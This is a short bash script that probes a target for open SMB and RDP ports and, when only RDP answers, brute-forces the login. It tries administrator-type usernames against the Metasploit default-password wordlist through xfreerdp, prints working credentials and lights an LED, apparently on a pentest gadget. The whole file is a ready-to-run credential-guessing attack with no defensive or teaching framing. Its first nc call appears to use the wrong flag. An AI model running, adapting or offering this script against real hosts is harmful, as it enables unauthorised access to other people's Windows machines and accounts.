#!/bin/bash

WAIT=1
DPORT=3389

if nc -nv $WAIT $1 445 < /dev/null 2> /dev/null; then
	true # ignore rdp bruteforce if smb port has opened
elif nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo 'bruteforcing rdp'
	for user in администратор administrator admin; do
		for password in $(cat /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt); do
			if xfreerdp /v:$1:$DPORT /u:$user /p:$password /cert-ignore +auth-only /sec:nla > /dev/null 2> /dev/null; then 
				echo user:$user password:$password | grep 'password:'
				led red on 2> /dev/null
			fi
		done
	done
fi